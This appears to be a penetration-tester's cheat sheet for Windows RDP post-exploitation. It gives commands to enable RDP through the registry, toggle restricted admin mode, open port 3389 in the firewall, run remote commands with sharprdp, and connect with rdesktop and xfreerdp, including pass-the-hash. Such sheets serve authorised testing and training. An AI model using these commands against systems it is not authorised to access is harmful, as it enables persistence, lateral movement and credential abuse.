# windows rdp

% rdp, windows, 3389
#platform/windows  #target/local  #protocol/rdp #port/3389

## enable RDP
#cat/POSTEXPLOIT 
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

## enable restricted admin
#cat/POSTEXPLOIT 
```
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

## disable restricted admin
#cat/POSTEXPLOIT 
```
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin
```

## rdp from console
```
sharprdp.exe computername=<computer> command="<command>" username=<domain>\<user> password=<password>
```

## Add firewall authorisation RDP
#cat/POSTEXPLOIT 
```
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes profile=private,domain localport=3389 protocol=tcp
```

# rdesktop
% rdp, windows
#platform/linux  #target/remote  #protocol/rdp #port/3389 #cat/ATTACK/CONNECT 

## rdesktop - classic
```
rdesktop -g 90% <ip> -u <user> -p <password> -d <domain>
```

## rdesktop - with share
```
rdesktop -g 90% <ip> -u <user> -p <password> -d <domain> -r disk:share=<share>
```

# xfreerdp

% rdp, windows
#platform/linux  #target/remote  #protocol/rdp #port/3389 #cat/ATTACK/CONNECT 

## xfreerdp - classic
```
xfreerdp /u:<user> /p:<password> /d:<domain> /v:<ip> /size:1800x924
```

## xfreerdp - with share
```
xfreerdp /u:<user> /p:<password> /d:<domain> /v:<ip> /size:1800x924 /drive:share,<share>
```

## xfreerdp - pass the hash
```
xfreerdp /u:<user> /pth:<hash> /d:<domain> /v:<ip>
```
